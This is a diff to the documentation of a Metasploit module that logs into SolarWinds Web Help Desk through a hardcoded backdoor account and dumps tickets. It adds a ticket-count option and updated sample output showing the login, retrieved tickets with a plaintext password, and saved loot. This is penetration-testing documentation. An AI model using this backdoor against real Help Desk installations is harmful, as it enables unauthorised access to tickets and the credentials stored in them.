@@ -27,6 +27,11 @@ msf6 auxiliary(gather/solarwinds_webhelpdesk_backdoor) > run
 
 This should return all the tickets from the Web Help Desk platform.
 
+## Options
+
+### TICKETSTODUMP
+The number of tickets to dump to the terminal.
+
 ## Scenarios
 
 Running the exploit against Web Help Desk v12.8.1 on Windows 22H2 should result in an output similar to the following:
@@ -35,8 +40,10 @@ Running the exploit against Web Help Desk v12.8.1 on Windows 22H2 should result 
 msf6 auxiliary(gather/solarwinds_webhelpdesk_backdoor) > run
 [*] Running module against 192.168.217.145
 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
 [*] Authenticating with the backdoor account "helpdeskIntegrationUser"...
-[+] Successfully authenticated and tickets retrieved:
+[+] Successfully authenticated and tickets retrieved. Displaying the first 2 tickets retrieved:
 [+] [
   {
     "id": 2,
@@ -46,7 +53,7 @@ msf6 auxiliary(gather/solarwinds_webhelpdesk_backdoor) > run
     "shortDetail": "Hi,\r\n\r\nhere is your super secure password: foo\r\n\r\nYour IT Support",
     "displayClient": "No Client",
     "updateFlagType": 2,
-    "prettyLastUpdated": "18 minutes ago",
+    "prettyLastUpdated": "13 hours ago",
     "latestNote": null
   },
   {
@@ -57,9 +64,10 @@ msf6 auxiliary(gather/solarwinds_webhelpdesk_backdoor) > run
     "shortDetail": "Congratulations! You have successfully installed Web Help Desk. Further configuration options are...",
     "displayClient": "Demo Client",
     "updateFlagType": 2,
-    "prettyLastUpdated": "4 hours ago",
+    "prettyLastUpdated": "17 hours ago",
     "latestNote": null
   }
 ]
+[+] Saved 2 tickets to /home/asdf/.msf4/loot/20240926004744_default_unknown_solarwinds_webhe_825328.txt
 [*] Auxiliary module execution completed
 ```
